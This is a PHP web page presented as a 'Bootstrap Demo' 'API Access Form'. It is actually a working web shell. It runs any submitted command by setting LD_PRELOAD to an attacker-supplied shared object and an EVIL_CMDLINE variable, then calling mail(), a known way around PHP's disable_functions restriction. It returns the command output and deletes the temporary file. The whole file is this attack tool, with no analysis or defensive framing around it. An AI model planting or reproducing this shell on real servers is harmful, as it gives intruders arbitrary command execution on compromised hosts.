<?php
// Handle API request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');

    $response = array();

    $response['example'] = "http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so";

    $cmd = $_POST["cmd"];
    $out_path = $_POST["outpath"];
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    $response['cmdline'] = $evil_cmdline;

    putenv("EVIL_CMDLINE=" . $evil_cmdline);

    $so_path = $_POST["sopath"];
    putenv("LD_PRELOAD=" . $so_path);

    mail("", "", "", "");

    $response['output'] = nl2br(file_get_contents($out_path));

    unlink($out_path);

    echo json_encode($response, JSON_PRETTY_PRINT);
    exit; // Stop further execution
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Bootstrap Demo</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
</head>

<body class="bg-light">
    <div class="container mt-5">
        <h1 class="mb-4">API Access Form</h1>
        <form method="post" id="apiForm">
            <div class="mb-3">
                <label for="cmd" class="form-label">Command:</label>
                <input type="text" class="form-control" id="cmd" name="cmd" placeholder="Enter command" required>
            </div>

            <div class="mb-3">
                <label for="outpath" class="form-label">Output Path:</label>
                <input type="text" class="form-control" id="outpath" name="outpath" placeholder="Enter output path" required>
            </div>

            <div class="mb-3">
                <label for="sopath" class="form-label">SO Path:</label>
                <input type="text" class="form-control" id="sopath" name="sopath" placeholder="Enter SO path" required>
            </div>

            <button type="submit" class="btn btn-primary" id="sbmtbtn">Submit</button>
        </form>

        <div class="mt-4">
            <h2>Result:</h2>
            <div id="result" class="bg-white p-3"></div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
    <script>
        document.getElementById("apiForm").addEventListener("submit", function(event) {
            event.preventDefault();
            disableSubmitButton();
            makeApiRequest();
        });

        function disableSubmitButton() {
            var submitButton = document.getElementById("sbmtbtn");
            submitButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Loading...';
            submitButton.disabled = true;
        }

        function makeApiRequest() {
            var cmd = document.getElementById("cmd").value;
            var outpath = document.getElementById("outpath").value;
            var sopath = document.getElementById("sopath").value;

            // This assumes the PHP file is in the same directory.
            var apiUrl = window.location.href;

            // Make a POST request to the API
            fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'cmd=' + encodeURIComponent(cmd) +
                        '&outpath=' + encodeURIComponent(outpath) +
                        '&sopath=' + encodeURIComponent(sopath),
                })
                .then(response => response.json())
                .then(data => {
                    // Display the API response
                    document.getElementById("result").innerHTML = "<pre>" + data.output + "</pre>";
                })
                .catch(error => {
                    console.error('Error:', error);
                    document.getElementById("result").innerHTML = "<p>Error occurred. Please try again.</p>";
                })
                .finally(function() {
                    // Re-enable the submit button after the request is complete
                    enableSubmitButton();
                });
        }

        function enableSubmitButton() {
            var submitButton = document.getElementById("sbmtbtn");
            submitButton.innerHTML = 'Submit';
            submitButton.disabled = false;
        }
    </script>
</body>

</html>